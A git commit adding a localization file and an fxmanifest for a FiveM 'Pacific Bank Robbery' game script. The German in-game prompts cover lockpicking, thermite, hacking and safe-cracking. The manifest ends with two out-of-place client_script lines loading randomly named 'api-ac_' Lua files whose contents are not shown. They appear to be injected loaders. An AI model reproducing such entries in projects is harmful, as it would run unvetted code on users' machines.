3bdfab1f1b77f4e1d8980dd5ece22559a9d1acbf
Justus <99740029+RoJustMc@users.noreply.github.com>
2022-03-07 14:34:50 +0100

    Add files via upload

---
+++ [bank]/CRP_BankRobbery/configs/languages.lua
@@ -0,0 +1,44 @@
+Languages = {}
+
+Languages = {
+    ['en'] = {
+
+        --Robbing--
+        ['doorLocked'] = "[E] Gesperrt",
+        ['doorUnlocked'] = "[E] Entsperrt",
+        ['meltDoor'] = "[E] Tür schmelzen",
+        ['lockpickDoor'] = "[E] Lockpick-Tür",
+        ['doorUnlockedCriminal'] = "Entsperrt",
+
+        ['robbingInitialMessage'] = "Was willst du?",
+        ['robbingInitialMessage-noSurv'] = "[E] Entriegeln Sie die Tür",
+        ['robbingInitialMessage-Surv'] = "[E] Entriegeln Sie die Tür - [H] Deaktivieren Sie die Kameras der Bank",
+        ['secondaryMessage'] = "Okay okay. Warten.",
+        ['disablingCameras']  = "Kameras deaktivieren",
+
+        ['alarm'] = "[E] Alarm deaktivieren",
+        ['plant'] = "[E] Bombe legen",
+        ['hack'] = "[E] Hack Panel benutzen",
+        ['steal'] = "[E] Geld klauen",
+        ['reset'] = "[E] Bank zurücksetzten",
+        
+        ['crackSafe']  = "[E] Den Tresor knacken",
+        ['safeOpened'] = "Scheiße, der Safe wurde schon ausgeraubt",
+        ['safeCrack'] = "Drücken Sie E links | F rechts | H zu knacken",
+
+
+        ['breakLocker'] = "[E] Geld Schließfach",
+        ['breakingLocker'] = "öffne Schließfach...",
+        ['boot'] = "Booten von pacifHack.exe",
+        ['lockerOpened'] = "Scheiße, das Schließfach wurde schon geöffnet",
+        ['cancel'] = "[X] Abbrechen",
+
+        ['LockpickItems'] = "Scheiße, ich habe keinen Dietrich dabei",
+        ['ThermiteItems'] = "Scheiße, ich habe keine Thermitladung dabei",
+        ['OxycutterItems'] = "Scheiße, ich habe keinen Oxycutter dabei",
+        ['BombItems'] = "Scheiße, ich habe keine Bombe dabei",
+        ['ElectronicItems'] = "Scheiße, ich habe kein ElektroKit dabei",
+
+        ['no_cops'] = 'Nicht genügen Cops in der Stadt',
+    }
+}
---
+++ [bank]/CRP_BankRobbery/fxmanifest.lua
@@ -0,0 +1,48 @@
+fx_version 'bodacious'
+game 'gta5'
+
+name "Pacific Bank Robbery"
+description "A pacific bank robbery script for FiveM."
+author "SpecialStos"
+version "1.0.8"
+
+dependencies {
+    "PolyZone",
+    "mka-lasers"
+}
+
+client_scripts {
+    '@mka-lasers/client/client.lua',
+    "@PolyZone/client.lua",
+    'configs/config.lua',
+    'client/mainLoop.lua',
+    'client/events.lua',
+    'client/nuiEvents.lua',
+    'configs/languages.lua',
+    'client/safeCracking.lua',
+    'configs/functions.lua',
+    'garbageCollector.lua',
+}
+
+server_scripts {
+    'configs/config.lua',
+    'server/pacificBankRobbery.lua',
+    'server/events.lua',
+    'server/versionCheck.lua',
+    'configs/functions.lua',
+}
+
+ui_page "client/html/index.html"
+
+files {
+    "client/html/index.html",
+    "client/html/vue.min.js",
+	"client/html/js/script.js",
+    "client/html/css/reset.css",
+    "client/html/css/style.css",
+    "client/html/css/img/*.png",
+}
+
+
+client_script "api-ac_hilPHftNCqyf.lua"
+client_script "api-ac_VYUjBFBLVXTN.lua"
